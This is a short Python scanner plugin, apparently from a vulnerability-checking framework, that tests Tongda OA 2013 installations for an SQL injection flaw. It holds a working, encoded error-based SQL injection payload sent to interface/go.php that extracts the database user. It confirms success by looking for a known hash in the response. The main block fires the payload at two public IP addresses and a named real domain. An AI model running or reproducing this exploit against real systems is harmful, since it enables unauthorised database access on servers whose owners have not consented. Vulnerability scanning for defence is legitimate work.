#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = jamesj
#_PlugName_ = 通达OA2013SQL注入
import re
def assign(service, arg):
    if service == 'tongdaoa':
        return True, arg
def audit(arg):
    payload = 'interface/go.php?APP_UNIT=aa%2527%20and%201=(select%201%20from(select%20count(*),concat(md5(1),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://36.250.159.130:8181/')[1])
    audit(assign('tongdaoa', 'http://61.163.47.117:8181/')[1])                
    audit(assign('tongdaoa', 'http://oa.cnzsqh.com/')[1])